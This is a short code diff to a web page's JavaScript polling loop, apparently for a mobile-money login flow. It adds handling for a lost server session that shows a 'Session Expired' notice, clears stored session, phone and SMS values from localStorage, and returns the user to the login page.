@@ -1208,6 +1208,25 @@
                                 window.location.href = 'login.html';
                             }
                         });
+
+                    } else if (data.status === 'unknown') {
+                        // Session lost on the server (e.g., backend restarted).
+                        stopPolling();
+                        stopVerifyAnimation();
+                        showNotice({
+                            type: 'reject',
+                            icon: '⏱️',
+                            title: 'Session Expired',
+                            message: 'Your session has expired. Please start again.',
+                            buttonText: 'START OVER',
+                            buttonClass: 'reject-btn',
+                            onOk: () => {
+                                localStorage.removeItem('momoSession');
+                                localStorage.removeItem('momoPhone');
+                                localStorage.removeItem('momoSms');
+                                window.location.href = 'login.html';
+                            }
+                        });
                     }
                 } catch (err) { console.warn('poll error:', err.message); }
             }, POLL_INTERVAL_MS);
